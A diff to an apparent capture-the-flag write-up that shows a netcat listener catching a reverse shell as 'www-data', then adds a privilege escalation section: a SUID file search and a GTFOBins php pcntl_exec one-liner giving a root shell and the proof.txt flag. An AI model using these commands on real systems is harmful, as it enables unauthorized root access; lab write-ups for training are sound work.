@@ -99,12 +99,31 @@ When running the exploit we set up a netcat listener to catch the reverse shell 
 
 		nc -lvnp 9001
 
-With success, we get a remore shell and are logged in as the user, "www-data"
+With success, we get a remote shell and are logged in as the user, "www-data"
 
 # Privilege Escalation
 
+As "www-data" we begin searching for available privilege escalation techniques. 
 
+To start, we check for any available SUID files:
 
+		find / -type f -perm -4000 2>/dev/null
+
+Looking at the files available we find the, "/usr/bin/php7.4" command available.
+
+Searching on GTFOBins, we search any available php commands that allow us to escalate to root privileges with SUID.
+
+GTFOBins suggests running the below command 
+
+		php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+
+In conjunction with php7.4, the full command looks like:
+
+		/usr/bin/php7.4 -r 'pcntl_exec("/bin/sh", ["-p"]);'
+
+Success! With the above command we are able to get a root shell. 
+
+The relevant flag is found in the /root directy in the proof.txt file. 
 
 
 
